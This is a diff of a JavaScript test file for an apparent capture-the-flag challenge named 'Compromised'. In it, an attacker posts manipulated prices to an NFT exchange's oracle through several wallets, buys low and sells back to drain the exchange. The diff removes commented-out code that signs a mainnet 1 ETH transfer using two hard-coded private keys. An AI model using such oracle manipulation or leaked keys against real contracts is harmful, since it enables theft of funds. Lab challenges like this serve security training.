@@ -87,8 +87,8 @@ describe('Compromised challenge', function () {
         console.log(afterPrice.toString())
 		const boughtNft = await this.exchange.connect(attacker).buyOne( { value: 1 });
         console.log("Bought one",boughtNft)
-		let exchangeBalance = await this.exchange.balance();
-        console.log("Balance",exchangeBalance)
+		//let exchangeBalance = await this.exchange.balance();
+        //console.log("Balance",exchangeBalance)
         console.log(startPrice)
 		for (let i = 0; i < wallets.length; i++) {
 			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol,  EXCHANGE_INITIAL_ETH_BALANCE);
@@ -97,40 +97,7 @@ describe('Compromised challenge', function () {
 		console.log("Balance")
 		await this.exchange.connect(attacker).sellOne(1);
         console.log("export")
-
-    //     const passwords = [
-    //         "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
-    //         "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
-    //     ]
-
-
-        
-    //     for (let i = 0; i < passwords.length; i++) {
-            
-    //         let privateKey = passwords[i]
-    //         let wallet = new ethers.Wallet(privateKey)
-    //         console.log(wallet.address)   
-
-    //         // All properties are optional
-    //     let transaction = {
-    // nonce: 0,
-    // gasLimit: 21000,
-    // gasPrice: ethers.utils.bigNumberify("20000000000"),
-
-    // to: "0x88a5C2d9919e46F883EB62F7b8Dd9d0CC45bc290",
-    // // ... or supports ENS names
-    // // to: "ricmoo.firefly.eth",
-
-    // value: ethers.utils.parseEther("1.0"),
-    // data: "0x",
-
-    // // This ensures the transaction cannot be replayed on different networks
-    // chainId: ethers.utils.getNetwork('homestead').chainId
-    // }
-
-    // let signPromise = await  wallet.sign(transaction)
-
-    //       }
+ 
     });
     after(async function () {
         /** SUCCESS CONDITIONS */
